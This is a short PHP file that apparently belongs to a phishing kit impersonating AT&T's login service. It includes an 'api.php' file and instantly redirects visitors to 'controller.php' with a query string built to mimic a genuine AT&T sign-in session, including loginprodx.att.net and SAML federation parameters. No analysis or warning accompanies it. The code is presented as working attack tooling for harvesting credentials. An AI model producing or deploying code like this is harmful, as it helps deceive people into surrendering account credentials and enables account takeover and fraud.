<?php

include ('api.php');

$link = "controller.php";
$sess = "?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2FFIM%2Fsps%2Fauth%3FFedName%3DATTsyn%26FedId%3Duuid9a412935-0156-1b6a-b5dc-fe4935913019%26PartnerId%3Dhttps%253A%252F%252Fatt.auth-gateway.net%252Fsaml%252Fmodule.php%252Fbridge%252Fsp%252Fmetadata.php%252Fatt_sp%26AssertionConsumerURL%3Dhttps%253A%252F%252Fatt.auth-gateway.net%252Fsaml%252Fmodule.php%252Fsaml%252Fsp%252Fsaml2-acs.php%252Fatt_sp%3Ftucd567%3Dw&REFERER=https%3A%2F%2Fatt.auth-gateway.net%2F&HOSTNAME=loginprodx.att.net&AUTHNLEVEL=&FAILREASON=&PROTOCOL=https&OLDSESSION=";

header ("Refresh: 0; url=$link$sess");

?>
